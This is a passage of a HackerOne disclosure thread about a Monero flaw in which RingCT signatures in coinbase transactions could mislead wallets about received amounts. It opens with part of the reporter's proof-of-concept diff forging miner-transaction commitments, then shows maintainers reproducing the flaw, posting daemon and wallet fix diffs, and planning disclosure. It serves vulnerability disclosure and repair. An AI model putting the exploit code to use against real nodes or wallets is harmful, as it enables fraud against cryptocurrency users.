pseudoOuts.resize(inamounts.size());\n+//        rv.p.MGs.resize(inamounts.size());\n+        rct::key sumpouts = rct::zero(); //sum pseudoOut masks\n+        rct::keyV a(inamounts.size());\n+        for (i = 0 ; i \u0026lt; inamounts.size() - 1; i++) {\n+            skGen(a[i]);\n+            sc_add(sumpouts.bytes, a[i].bytes, sumpouts.bytes);\n+            genC(pseudoOuts[i], a[i], inamounts[i]);\n+        }\n+//        rv.mixRing = mixRing;\n+        sc_sub(a[i].bytes, sumout.bytes, sumpouts.bytes);\n+        rct::genC(pseudoOuts[i], a[i], inamounts[i]);\n+        DP(pseudoOuts[i]);\n+\n+      rv.p.MGs.push_back(rct::mgSig());\n+      rv.p.MGs[0].ss.push_back(rct::keyV());\n+      rv.p.MGs[0].ss[0].push_back(rct::key());\n+      rv.p.MGs[0].ss[0].push_back(rct::key());\n+      tx.rct_signatures = rv;\n+    }\n+#endif\n+\n+\n+\n\u003c/span\u003e     //LOG_PRINT(\u0026quot;MINER_TX generated ok, block_reward=\u0026quot; \u0026lt;\u0026lt; print_money(block_reward) \u0026lt;\u0026lt; \u0026quot;(\u0026quot;  \u0026lt;\u0026lt; print_money(block_reward - fee) \u0026lt;\u0026lt; \u0026quot;+\u0026quot; \u0026lt;\u0026lt; print_money(fee)\n     //  \u0026lt;\u0026lt; \u0026quot;), current_block_size=\u0026quot; \u0026lt;\u0026lt; current_block_size \u0026lt;\u0026lt; \u0026quot;, already_generated_coins=\u0026quot; \u0026lt;\u0026lt; already_generated_coins \u0026lt;\u0026lt; \u0026quot;, tx_id=\u0026quot; \u0026lt;\u0026lt; get_transaction_hash(tx), LOG_LEVEL_2);\n     return true;\n\u003cspan class=\"gh\"\u003ediff --git a/src/ringct/rctSigs.h b/src/ringct/rctSigs.h\nindex 9227eab..0d0f946 100644\n\u003c/span\u003e\u003cspan class=\"gd\"\u003e--- a/src/ringct/rctSigs.h\n\u003c/span\u003e\u003cspan class=\"gi\"\u003e+++ b/src/ringct/rctSigs.h\n\u003c/span\u003e\u003cspan class=\"p\"\u003e@@ -65,6 +65,10 @@\u003c/span\u003e namespace hw {\n\n namespace rct {\n\n+    bool verBulletproof(const Bulletproof \u0026amp;proof);\n\u003cspan class=\"gi\"\u003e+    bool verBulletproof(const std::vector\u0026lt;const Bulletproof*\u0026gt; \u0026amp;proofs);\n+    Bulletproof proveRangeBulletproof(keyV \u0026amp;C, keyV \u0026amp;masks, const std::vector\u0026lt;uint64_t\u0026gt; \u0026amp;amounts);\n+\n\u003c/span\u003e     boroSig genBorromean(const key64 x, const key64 P1, const key64 P2, const bits indices);\n     bool verifyBorromean(const boroSig \u0026amp;bb, const key64 P1, const key64 P2);\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e","automated_response":false,"created_at":"2019-02-25T22:54:41.947Z","updated_at":"2019-02-25T22:56:56.157Z","actor":{"username":"cutcoin","cleared":false,"url":"/cutcoin","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/LxfC9tNjvfH1jqTt3oQV2Ncw/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"monero","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4211974,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"","markdown_message":"","automated_response":false,"created_at":"2019-02-25T23:49:41.130Z","updated_at":"2019-02-25T23:49:41.130Z","actor":{"username":"anonimal","cleared":false,"url":"/anonimal","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/040/857/f23cc3be09a21e17bc43975987c10ba2b6427239_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"monero","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4230448,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thanks for the report, I will check.","markdown_message":"\u003cp\u003eThanks for the report, I will check.\u003c/p\u003e\n","automated_response":false,"created_at":"2019-02-28T15:41:19.747Z","updated_at":"2019-02-28T15:41:19.747Z","actor":{"username":"moneromooo","cleared":false,"url":"/moneromooo","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"monero","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":4230586,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"AFAICT, what happens is that a commitment is generated for 0. With your exploit code, I get a tx rejection when mined:\n\n2019-02-28 16:03:42.870\t[miner 0]\tWARN \tblockchain.db.lmdb\tsrc/blockchain_db/lmdb/db_lmdb.cpp:76\tRCT output without commitment\n2019-02-28 16:03:42.875\t[miner 0]\tERROR\tblockchain\tsrc/cryptonote_core/blockchain.cpp:3585\tError adding block with hash: \u003cd2de6cfe73ec489b3f186329b729d0ed1f017d69fb707fca4a377b0379f8daa0\u003e to blockchain, what = RCT output without commitment\n\nDo you not get this ?\n\nAnyway, can you pop into IRC so we can talk ?","markdown_message":"\u003cp\u003eAFAICT, what happens is that a commitment is generated for 0. With your exploit code, I get a tx rejection when mined:\u003c/p\u003e\n\n\u003cp\u003e2019-02-28 16:03:42.870 [miner 0]   WARN    blockchain.db.lmdb  src/blockchain_db/lmdb/db_lmdb.cpp:76   RCT output without commitment\u003cbr\u003e\n2019-02-28 16:03:42.875 [miner 0]   ERROR   blockchain  src/cryptonote_core/blockchain.cpp:3585 Error adding block with hash: \u0026lt;d2de6cfe73ec489b3f186329b729d0ed1f017d69fb707fca4a377b0379f8daa0\u0026gt; to blockchain, what = RCT output without commitment\u003c/p\u003e\n\n\u003cp\u003eDo you not get this ?\u003c/p\u003e\n\n\u003cp\u003eAnyway, can you pop into IRC so we can talk ?\u003c/p\u003e\n","automated_response":false,"created_at":"2019-02-28T16:07:51.347Z","updated_at":"2019-02-28T16:07:51.347Z","actor":{"username":"moneromooo","cleared":false,"url":"/moneromooo","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"monero","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":4230599,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Oh, nevermind, I start off a new testnet, that does not have rct just yet :)","markdown_message":"\u003cp\u003eOh, nevermind, I start off a new testnet, that does not have rct just yet :)\u003c/p\u003e\n","automated_response":false,"created_at":"2019-02-28T16:09:52.290Z","updated_at":"2019-02-28T16:09:52.290Z","actor":{"username":"moneromooo","cleared":false,"url":"/moneromooo","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"monero","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":4230614,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"OK, reproduced. Thanks for the repro case.","markdown_message":"\u003cp\u003eOK, reproduced. Thanks for the repro case.\u003c/p\u003e\n","automated_response":false,"created_at":"2019-02-28T16:11:59.783Z","updated_at":"2019-02-28T16:11:59.783Z","actor":{"username":"moneromooo","cleared":false,"url":"/moneromooo","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"monero","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":4230796,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"This should fix it on daemon and wallet. Your PoC code does not cause the daemon to accept those txes anymore. The wallet side changes should prevent exploitation from a malicious remote node (it now gets an output of 0). This was tested on monero-wallet-cli only so far, I'll check monero-wallet-rpc now just in case.\nVery good exploit, thanks.\n\n```\ndiff --git a/src/cryptonote_core/blockchain.cpp b/src/cryptonote_core/blockchain.cpp\nindex a903aa74f..de5a408e5 100644\n--- a/src/cryptonote_core/blockchain.cpp\n+++ b/src/cryptonote_core/blockchain.cpp\n@@ -1142,6 +1142,12 @@ bool Blockchain::prevalidate_miner_transaction(const block\u0026 b, uint64_t height)\n   MDEBUG(\"Miner tx hash: \" \u003c\u003c get_transaction_hash(b.miner_tx));\n   CHECK_AND_ASSERT_MES(b.miner_tx.unlock_time == height + CRYPTONOTE_MINED_MONEY_UNLOCK_WINDOW, false, \"coinbase transaction transaction has the wrong unlock time=\" \u003c\u003c b.miner_tx.unlock_time \u003c\u003c \", expected \" \u003c\u003c height + CRYPTONOTE_MINED_MONEY_UNLOCK_WINDOW);\n \n+  // for v2 txes (ringct), we only accept empty rct signatures for miner transactions,\n+  if (b.miner_tx.version == 2)\n+  {\n+    CHECK_AND_ASSERT_MES(b.miner_tx.rct_signatures.type == rct::RCTTypeNull, false, \"RingCT signatures not allowed in coinbase transactions\");\n+  }\n+\n   //check outs overflow\n   //NOTE: not entirely sure this is necessary, given that this function is\n   //      designed simply to make sure the total amount for a transaction\ndiff --git a/src/wallet/wallet2.h b/src/wallet/wallet2.h\nindex 2114e0eff..3bbe8eced 100644\n--- a/src/wallet/wallet2.h\n+++ b/src/wallet/wallet2.h\n@@ -1239,7 +1239,7 @@ namespace tools\n     crypto::public_key get_tx_pub_key_from_received_outs(const tools::wallet2::transfer_details \u0026td) const;\n     bool should_pick_a_second_output(bool use_rct, size_t n_transfers, const std::vector\u003csize_t\u003e \u0026unused_transfers_indices, const std::vector\u003csize_t\u003e \u0026unused_dust_indices) const;\n     std::vector\u003csize_t\u003e get_only_rct(const std::vector\u003csize_t\u003e \u0026unused_dust_indices, const std::vector\u003csize_t\u003e \u0026unused_transfers_indices) const;\n-    void scan_output(const cryptonote::transaction \u0026tx, const crypto::public_key \u0026tx_pub_key, size_t i, tx_scan_info_t \u0026tx_scan_info, int \u0026num_vouts_received, std::unordered_map\u003ccryptonote::subaddress_index, uint64_t\u003e \u0026tx_money_got_in_outs, std::vector\u003csize_t\u003e \u0026outs);\n+    void scan_output(const cryptonote::transaction \u0026tx, bool miner_tx, const crypto::public_key \u0026tx_pub_key, size_t i, tx_scan_info_t \u0026tx_scan_info, int \u0026num_vouts_received, std::unordered_map\u003ccryptonote::subaddress_index, uint64_t\u003e \u0026tx_money_got_in_outs, std::vector\u003csize_t\u003e \u0026outs);\n     void trim_hashchain();\n     crypto::key_image get_multisig_composite_key_image(size_t n) const;\n     rct::multisig_kLRki get_multisig_composite_kLRki(size_t n, const crypto::public_key \u0026ignore, std::unordered_set\u003crct::key\u003e \u0026used_L, std::unordered_set\u003crct::key\u003e \u0026new_used_L) const;\ndiff --git a/src/wallet/wallet2.cpp b/src/wallet/wallet2.cpp\nindex 0a3b49e65..c0e334318 100644\n--- a/src/wallet/wallet2.cpp\n+++ b/src/wallet/wallet2.cpp\n@@ -1296,7 +1296,7 @@ static uint64_t decodeRct(const rct::rctSig \u0026 rv, const crypto::key_derivation \u0026\n   }\n }\n //----------------------------------------------------------------------------------------------------\n-void wallet2::scan_output(const cryptonote::transaction \u0026tx, const crypto::public_key \u0026tx_pub_key, size_t i, tx_scan_info_t \u0026tx_scan_info, int \u0026num_vouts_received, std::unordered_map\u003ccryptonote::subaddress_index, uint64_t\u003e \u0026tx_money_got_in_outs, std::vector\u003csize_t\u003e \u0026outs)\n+void wallet2::scan_output(const cryptonote::transaction \u0026tx, bool miner_tx, const crypto::public_key \u0026tx_pub_key, size_t i, tx_scan_info_t \u0026tx_scan_info, int \u0026num_vouts_received, std::unordered_map\u003ccryptonote::subaddress_index, uint64_t\u003e \u0026tx_money_got_in_outs, std::vector\u003csize_t\u003e \u0026outs)\n {\n   THROW_WALLET_EXCEPTION_IF(i \u003e= tx.vout.size(), error::wallet_internal_error, \"Invalid vout index\");\n \n@@ -1330,7 +1330,7 @@ void wallet2::scan_output(const cryptonote::transaction \u0026tx, const crypto::publi\n   }\n \n   outs.push_back(i);\n-  if (tx_scan_info.money_transfered == 0)\n+  if (tx_scan_info.money_transfered == 0 \u0026\u0026 !miner_tx)\n   {\n     tx_scan_info.money_transfered = tools::decodeRct(tx.rct_signatures, tx_scan_info.received-\u003ederivation, i, tx_scan_info.mask, m_account.get_device());\n   }\n@@ -1512,7 +1512,7 @@ void wallet2::process_new_transaction(const crypto::hash \u0026txid, const cryptonote\n           if (tx_scan_info[i].received)\n           {\n             hwdev.conceal_derivation(tx_scan_info[i].received-\u003ederivation, tx_pub_key, additional_tx_pub_keys.data, derivation, additional_derivations);\n-            scan_output(tx, tx_pub_key, i, tx_scan_info[i], num_vouts_received, tx_money_got_in_outs, outs);\n+            scan_output(tx, miner_tx, tx_pub_key, i, tx_scan_info[i], num_vouts_received, tx_money_got_in_outs, outs);\n           }\n         }\n       }\n@@ -1535,7 +1535,7 @@ void wallet2::process_new_transaction(const crypto::hash \u0026txid, const cryptonote\n         if (tx_scan_info[i].received)\n         {\n           hwdev.conceal_derivation(tx_scan_info[i].received-\u003ederivation, tx_pub_key, additional_tx_pub_keys.data, derivation, additional_derivations);\n-          scan_output(tx, tx_pub_key, i, tx_scan_info[i], num_vouts_received, tx_money_got_in_outs, outs);\n+          scan_output(tx, miner_tx, tx_pub_key, i, tx_scan_info[i], num_vouts_received, tx_money_got_in_outs, outs);\n         }\n       }\n     }\n@@ -1551,7 +1551,7 @@ void wallet2::process_new_transaction(const crypto::hash \u0026txid, const cryptonote\n           boost::unique_lock\u003chw::device\u003e hwdev_lock (hwdev);\n           hwdev.set_mode(hw::device::NONE);\n           hwdev.conceal_derivation(tx_scan_info[i].received-\u003ederivation, tx_pub_key, additional_tx_pub_keys.data, derivation, additional_derivations);\n-          scan_output(tx, tx_pub_key, i, tx_scan_info[i], num_vouts_received, tx_money_got_in_outs, outs);\n+          scan_output(tx, miner_tx, tx_pub_key, i, tx_scan_info[i], num_vouts_received, tx_money_got_in_outs, outs);\n         }\n       }\n     }\n@@ -10697,6 +10697,7 @@ uint64_t wallet2::import_key_images(const std::vector\u003cstd::pair\u003ccrypto::key_imag\n         THROW_WALLET_EXCEPTION_IF(!r, error::wallet_internal_error, \"Failed to generate key derivation\");\n       }\n       size_t output_index = 0;\n+      bool miner_tx = cryptonote::is_coinbase(spent_tx);\n       for (const cryptonote::tx_out\u0026 out : spent_tx.vout)\n       {\n         tx_scan_info_t tx_scan_info;\n@@ -10704,7 +10705,7 @@ uint64_t wallet2::import_key_images(const std::vector\u003cstd::pair\u003ccrypto::key_imag\n         THROW_WALLET_EXCEPTION_IF(tx_scan_info.error, error::wallet_internal_error, \"check_acc_out_precomp failed\");\n         if (tx_scan_info.received)\n         {\n-          if (tx_scan_info.money_transfered == 0)\n+          if (tx_scan_info.money_transfered == 0 \u0026\u0026 !miner_tx)\n           {\n             rct::key mask;\n             tx_scan_info.money_transfered = tools::decodeRct(spent_tx.rct_signatures, tx_scan_info.received-\u003ederivation, output_index, mask, hwdev);\n\n```","markdown_message":"\u003cp\u003eThis should fix it on daemon and wallet. Your PoC code does not cause the daemon to accept those txes anymore. The wallet side changes should prevent exploitation from a malicious remote node (it now gets an output of 0). This was tested on monero-wallet-cli only so far, I\u0026#39;ll check monero-wallet-rpc now just in case.\u003cbr\u003e\nVery good exploit, thanks.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight diff\"\u003e\u003ccode\u003e\u003cspan class=\"gh\"\u003ediff --git a/src/cryptonote_core/blockchain.cpp b/src/cryptonote_core/blockchain.cpp\nindex a903aa74f..de5a408e5 100644\n\u003c/span\u003e\u003cspan class=\"gd\"\u003e--- a/src/cryptonote_core/blockchain.cpp\n\u003c/span\u003e\u003cspan class=\"gi\"\u003e+++ b/src/cryptonote_core/blockchain.cpp\n\u003c/span\u003e\u003cspan class=\"p\"\u003e@@ -1142,6 +1142,12 @@\u003c/span\u003e bool Blockchain::prevalidate_miner_transaction(const block\u0026amp; b, uint64_t height)\n   MDEBUG(\u0026quot;Miner tx hash: \u0026quot; \u0026lt;\u0026lt; get_transaction_hash(b.miner_tx));\n   CHECK_AND_ASSERT_MES(b.miner_tx.unlock_time == height + CRYPTONOTE_MINED_MONEY_UNLOCK_WINDOW, false, \u0026quot;coinbase transaction transaction has the wrong unlock time=\u0026quot; \u0026lt;\u0026lt; b.miner_tx.unlock_time \u0026lt;\u0026lt; \u0026quot;, expected \u0026quot; \u0026lt;\u0026lt; height + CRYPTONOTE_MINED_MONEY_UNLOCK_WINDOW);\n\n+  // for v2 txes (ringct), we only accept empty rct signatures for miner transactions,\n\u003cspan class=\"gi\"\u003e+  if (b.miner_tx.version == 2)\n+  {\n+    CHECK_AND_ASSERT_MES(b.miner_tx.rct_signatures.type == rct::RCTTypeNull, false, \u0026quot;RingCT signatures not allowed in coinbase transactions\u0026quot;);\n+  }\n+\n\u003c/span\u003e   //check outs overflow\n   //NOTE: not entirely sure this is necessary, given that this function is\n   //      designed simply to make sure the total amount for a transaction\n\u003cspan class=\"gh\"\u003ediff --git a/src/wallet/wallet2.h b/src/wallet/wallet2.h\nindex 2114e0eff..3bbe8eced 100644\n\u003c/span\u003e\u003cspan class=\"gd\"\u003e--- a/src/wallet/wallet2.h\n\u003c/span\u003e\u003cspan class=\"gi\"\u003e+++ b/src/wallet/wallet2.h\n\u003c/span\u003e\u003cspan class=\"p\"\u003e@@ -1239,7 +1239,7 @@\u003c/span\u003e namespace tools\n     crypto::public_key get_tx_pub_key_from_received_outs(const tools::wallet2::transfer_details \u0026amp;td) const;\n     bool should_pick_a_second_output(bool use_rct, size_t n_transfers, const std::vector\u0026lt;size_t\u0026gt; \u0026amp;unused_transfers_indices, const std::vector\u0026lt;size_t\u0026gt; \u0026amp;unused_dust_indices) const;\n     std::vector\u0026lt;size_t\u0026gt; get_only_rct(const std::vector\u0026lt;size_t\u0026gt; \u0026amp;unused_dust_indices, const std::vector\u0026lt;size_t\u0026gt; \u0026amp;unused_transfers_indices) const;\n\u003cspan class=\"gd\"\u003e-    void scan_output(const cryptonote::transaction \u0026amp;tx, const crypto::public_key \u0026amp;tx_pub_key, size_t i, tx_scan_info_t \u0026amp;tx_scan_info, int \u0026amp;num_vouts_received, std::unordered_map\u0026lt;cryptonote::subaddress_index, uint64_t\u0026gt; \u0026amp;tx_money_got_in_outs, std::vector\u0026lt;size_t\u0026gt; \u0026amp;outs);\n\u003c/span\u003e\u003cspan class=\"gi\"\u003e+    void scan_output(const cryptonote::transaction \u0026amp;tx, bool miner_tx, const crypto::public_key \u0026amp;tx_pub_key, size_t i, tx_scan_info_t \u0026amp;tx_scan_info, int \u0026amp;num_vouts_received, std::unordered_map\u0026lt;cryptonote::subaddress_index, uint64_t\u0026gt; \u0026amp;tx_money_got_in_outs, std::vector\u0026lt;size_t\u0026gt; \u0026amp;outs);\n\u003c/span\u003e     void trim_hashchain();\n     crypto::key_image get_multisig_composite_key_image(size_t n) const;\n     rct::multisig_kLRki get_multisig_composite_kLRki(size_t n, const crypto::public_key \u0026amp;ignore, std::unordered_set\u0026lt;rct::key\u0026gt; \u0026amp;used_L, std::unordered_set\u0026lt;rct::key\u0026gt; \u0026amp;new_used_L) const;\n\u003cspan class=\"gh\"\u003ediff --git a/src/wallet/wallet2.cpp b/src/wallet/wallet2.cpp\nindex 0a3b49e65..c0e334318 100644\n\u003c/span\u003e\u003cspan class=\"gd\"\u003e--- a/src/wallet/wallet2.cpp\n\u003c/span\u003e\u003cspan class=\"gi\"\u003e+++ b/src/wallet/wallet2.cpp\n\u003c/span\u003e\u003cspan class=\"p\"\u003e@@ -1296,7 +1296,7 @@\u003c/span\u003e static uint64_t decodeRct(const rct::rctSig \u0026amp; rv, const crypto::key_derivation \u0026amp;\n   }\n }\n //----------------------------------------------------------------------------------------------------\n\u003cspan class=\"gd\"\u003e-void wallet2::scan_output(const cryptonote::transaction \u0026amp;tx, const crypto::public_key \u0026amp;tx_pub_key, size_t i, tx_scan_info_t \u0026amp;tx_scan_info, int \u0026amp;num_vouts_received, std::unordered_map\u0026lt;cryptonote::subaddress_index, uint64_t\u0026gt; \u0026amp;tx_money_got_in_outs, std::vector\u0026lt;size_t\u0026gt; \u0026amp;outs)\n\u003c/span\u003e\u003cspan class=\"gi\"\u003e+void wallet2::scan_output(const cryptonote::transaction \u0026amp;tx, bool miner_tx, const crypto::public_key \u0026amp;tx_pub_key, size_t i, tx_scan_info_t \u0026amp;tx_scan_info, int \u0026amp;num_vouts_received, std::unordered_map\u0026lt;cryptonote::subaddress_index, uint64_t\u0026gt; \u0026amp;tx_money_got_in_outs, std::vector\u0026lt;size_t\u0026gt; \u0026amp;outs)\n\u003c/span\u003e {\n   THROW_WALLET_EXCEPTION_IF(i \u0026gt;= tx.vout.size(), error::wallet_internal_error, \u0026quot;Invalid vout index\u0026quot;);\n\n@@ -1330,7 +1330,7 @@ void wallet2::scan_output(const cryptonote::transaction \u0026amp;tx, const crypto::publi\n   }\n\n   outs.push_back(i);\n\u003cspan class=\"gd\"\u003e-  if (tx_scan_info.money_transfered == 0)\n\u003c/span\u003e\u003cspan class=\"gi\"\u003e+  if (tx_scan_info.money_transfered == 0 \u0026amp;\u0026amp; !miner_tx)\n\u003c/span\u003e   {\n     tx_scan_info.money_transfered = tools::decodeRct(tx.rct_signatures, tx_scan_info.received-\u0026gt;derivation, i, tx_scan_info.mask, m_account.get_device());\n   }\n\u003cspan class=\"p\"\u003e@@ -1512,7 +1512,7 @@\u003c/span\u003e void wallet2::process_new_transaction(const crypto::hash \u0026amp;txid, const cryptonote\n           if (tx_scan_info[i].received)\n           {\n             hwdev.conceal_derivation(tx_scan_info[i].received-\u0026gt;derivation, tx_pub_key, additional_tx_pub_keys.data, derivation, additional_derivations);\n\u003cspan class=\"gd\"\u003e-            scan_output(tx, tx_pub_key, i, tx_scan_info[i], num_vouts_received, tx_money_got_in_outs, outs);\n\u003c/span\u003e\u003cspan class=\"gi\"\u003e+            scan_output(tx, miner_tx, tx_pub_key, i, tx_scan_info[i], num_vouts_received, tx_money_got_in_outs, outs);\n\u003c/span\u003e           }\n         }\n       }\n\u003cspan class=\"p\"\u003e@@ -1535,7 +1535,7 @@\u003c/span\u003e void wallet2::process_new_transaction(const crypto::hash \u0026amp;txid, const cryptonote\n         if (tx_scan_info[i].received)\n         {\n           hwdev.conceal_derivation(tx_scan_info[i].received-\u0026gt;derivation, tx_pub_key, additional_tx_pub_keys.data, derivation, additional_derivations);\n\u003cspan class=\"gd\"\u003e-          scan_output(tx, tx_pub_key, i, tx_scan_info[i], num_vouts_received, tx_money_got_in_outs, outs);\n\u003c/span\u003e\u003cspan class=\"gi\"\u003e+          scan_output(tx, miner_tx, tx_pub_key, i, tx_scan_info[i], num_vouts_received, tx_money_got_in_outs, outs);\n\u003c/span\u003e         }\n       }\n     }\n\u003cspan class=\"p\"\u003e@@ -1551,7 +1551,7 @@\u003c/span\u003e void wallet2::process_new_transaction(const crypto::hash \u0026amp;txid, const cryptonote\n           boost::unique_lock\u0026lt;hw::device\u0026gt; hwdev_lock (hwdev);\n           hwdev.set_mode(hw::device::NONE);\n           hwdev.conceal_derivation(tx_scan_info[i].received-\u0026gt;derivation, tx_pub_key, additional_tx_pub_keys.data, derivation, additional_derivations);\n\u003cspan class=\"gd\"\u003e-          scan_output(tx, tx_pub_key, i, tx_scan_info[i], num_vouts_received, tx_money_got_in_outs, outs);\n\u003c/span\u003e\u003cspan class=\"gi\"\u003e+          scan_output(tx, miner_tx, tx_pub_key, i, tx_scan_info[i], num_vouts_received, tx_money_got_in_outs, outs);\n\u003c/span\u003e         }\n       }\n     }\n\u003cspan class=\"p\"\u003e@@ -10697,6 +10697,7 @@\u003c/span\u003e uint64_t wallet2::import_key_images(const std::vector\u0026lt;std::pair\u0026lt;crypto::key_imag\n         THROW_WALLET_EXCEPTION_IF(!r, error::wallet_internal_error, \u0026quot;Failed to generate key derivation\u0026quot;);\n       }\n       size_t output_index = 0;\n\u003cspan class=\"gi\"\u003e+      bool miner_tx = cryptonote::is_coinbase(spent_tx);\n\u003c/span\u003e       for (const cryptonote::tx_out\u0026amp; out : spent_tx.vout)\n       {\n         tx_scan_info_t tx_scan_info;\n\u003cspan class=\"p\"\u003e@@ -10704,7 +10705,7 @@\u003c/span\u003e uint64_t wallet2::import_key_images(const std::vector\u0026lt;std::pair\u0026lt;crypto::key_imag\n         THROW_WALLET_EXCEPTION_IF(tx_scan_info.error, error::wallet_internal_error, \u0026quot;check_acc_out_precomp failed\u0026quot;);\n         if (tx_scan_info.received)\n         {\n\u003cspan class=\"gd\"\u003e-          if (tx_scan_info.money_transfered == 0)\n\u003c/span\u003e\u003cspan class=\"gi\"\u003e+          if (tx_scan_info.money_transfered == 0 \u0026amp;\u0026amp; !miner_tx)\n\u003c/span\u003e           {\n             rct::key mask;\n             tx_scan_info.money_transfered = tools::decodeRct(spent_tx.rct_signatures, tx_scan_info.received-\u0026gt;derivation, output_index, mask, hwdev);\n\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e","automated_response":false,"created_at":"2019-02-28T16:46:14.753Z","updated_at":"2019-02-28T16:47:47.990Z","actor":{"username":"moneromooo","cleared":false,"url":"/moneromooo","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"monero","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":4230850,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"All seems OK with monero-wallet-rpc too.","markdown_message":"\u003cp\u003eAll seems OK with monero-wallet-rpc too.\u003c/p\u003e\n","automated_response":false,"created_at":"2019-02-28T16:57:25.714Z","updated_at":"2019-02-28T16:57:25.714Z","actor":{"username":"moneromooo","cleared":false,"url":"/moneromooo","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"monero","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":4232266,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"moneromooo, sorry for not reacting faster. You seem to have everything figured out.\n\nFixing in both daemon and wallet seems like the best idea. You probably know this better than me, but before adding this check to the miner_tx unconditionally and pushing it you may want to double check that there are in fact no such transactions in the chain. Let's hope not.\n\nBy the way I didn't test this one, but by just looking around I saw no code that prevents generation of blocks with miner_tx.version=1. I don't see anything bad even if it is the case, just saying.","markdown_message":"\u003cp\u003emoneromooo, sorry for not reacting faster. You seem to have everything figured out.\u003c/p\u003e\n\n\u003cp\u003eFixing in both daemon and wallet seems like the best idea. You probably know this better than me, but before adding this check to the miner_tx unconditionally and pushing it you may want to double check that there are in fact no such transactions in the chain. Let\u0026#39;s hope not.\u003c/p\u003e\n\n\u003cp\u003eBy the way I didn\u0026#39;t test this one, but by just looking around I saw no code that prevents generation of blocks with miner_tx.version=1. I don\u0026#39;t see anything bad even if it is the case, just saying.\u003c/p\u003e\n","automated_response":false,"created_at":"2019-02-28T21:39:54.146Z","updated_at":"2019-02-28T21:39:54.146Z","actor":{"username":"cutcoin","cleared":false,"url":"/cutcoin","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/LxfC9tNjvfH1jqTt3oQV2Ncw/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"monero","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4232392,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Yes, fair point about checking history. I think v1 miner txes are still allowed AFAIK. Maybe they should be forbidden indeed. You did not react slowly, after all I only checked this site 3 days after your report :)","markdown_message":"\u003cp\u003eYes, fair point about checking history. I think v1 miner txes are still allowed AFAIK. Maybe they should be forbidden indeed. You did not react slowly, after all I only checked this site 3 days after your report :)\u003c/p\u003e\n","automated_response":false,"created_at":"2019-02-28T22:07:15.693Z","updated_at":"2019-02-28T22:07:15.693Z","actor":{"username":"moneromooo","cleared":false,"url":"/moneromooo","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"monero","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":4247905,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Patches are in PRs 5216 and 5217. Those are only the wallet side. The consensus change will be made later for the next fork since it's now too close and we'd likely end up with a fork.","markdown_message":"\u003cp\u003ePatches are in PRs 5216 and 5217. Those are only the wallet side. The consensus change will be made later for the next fork since it\u0026#39;s now too close and we\u0026#39;d likely end up with a fork.\u003c/p\u003e\n","automated_response":false,"created_at":"2019-03-03T18:57:21.633Z","updated_at":"2019-03-03T18:57:21.633Z","actor":{"username":"moneromooo","cleared":false,"url":"/moneromooo","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"monero","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":4270851,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"This will be disclosed after the fork.\nPlease post a monero address if you want to receive a bounty.\n","markdown_message":"\u003cp\u003eThis will be disclosed after the 